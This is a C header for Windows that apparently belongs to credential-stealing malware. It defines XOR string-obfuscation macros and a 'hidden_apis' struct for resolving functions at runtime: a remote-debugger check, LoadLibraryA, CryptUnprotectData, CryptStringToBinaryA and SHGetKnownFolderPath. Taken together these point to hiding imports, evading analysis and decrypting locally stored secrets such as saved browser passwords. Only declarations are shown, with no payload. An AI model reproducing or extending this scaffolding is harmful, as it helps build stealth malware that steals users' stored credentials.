#ifndef OBFUSCATION_H
#define OBFUSCATION_H
#include <shlobj.h>
#include <knownfolders.h>
#include <stddef.h>
#include <windows.h>

#define XOR_STR(str, size)             \
  do {                                 \
    for (int i = 0; i < (size); ++i) { \
      (str)[i] ^= 42;                  \
    }                                  \
  } while (0)

#define XOR_WSTR(wstr, size)           \
  do {                                 \
    for (int i = 0; i < (size); ++i) { \
      (wstr)[i] ^= 42;                 \
    }                                  \
  } while (0)

#define REFKNOWNFOLDERID const KNOWNFOLDERID * __MIDL_CONST

typedef BOOL(WINAPI *PCheckRemoteDebuggerPresent)(HANDLE hProcess, PBOOL pbDebuggerPresent);
typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);
typedef BOOL(WINAPI *PCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, void*, void*, DWORD, DATA_BLOB*);
typedef BOOL(WINAPI *PCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
typedef HRESULT(WINAPI *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);


typedef struct {
  PCheckRemoteDebuggerPresent funcCheckRemoteDebuggerPresent;
  PLoadLibraryA funcLoadLibraryA;
  PCryptUnprotectData funcCryptUnprotectData;
  PCryptStringToBinaryA funcCryptStringToBinaryA;
  PSHGetKnownFolderPath funcSHGetKnownFolderPath;
} hidden_apis;


void resolve_apis(hidden_apis *apis);

#endif // OBFUSCATION_H
